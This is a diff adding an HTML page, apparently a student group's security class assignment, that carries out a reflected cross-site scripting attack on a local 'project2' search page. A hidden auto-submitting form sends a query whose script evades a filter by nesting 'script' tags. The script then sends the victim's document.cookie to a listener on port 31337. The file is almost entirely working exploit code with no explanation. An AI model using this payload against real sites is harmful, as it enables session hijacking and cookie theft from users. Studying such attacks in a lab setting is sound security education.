@@ -1,0 +1,26 @@
+<!--
+Group Members: Trent Chismar, Joshua Cominelli, Ryan Brockway
+References: w3schools, class notes, geeksforgeeks
+
+-->
+
+<html>
+
+    <iframe name="somename", style="display: none"></iframe>
+    <script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+    <form id="thesame", target= "somename" action="http://localhost/project2/search", method="GET", style="display: none">
+        <input name="xssdefense" value="2">
+        <input name="q" value="<sscriptcript>alert(document.cookie);
+            $.ajax({ type: 'get', url: 'http://localhost:31337', data: {'cookie': document.cookie}});
+        </sscriptcript>">
+        
+
+    </form>
+    <script>
+        document.getElementById("thesame").submit();
+
+    </script>
+
+
+</html> 
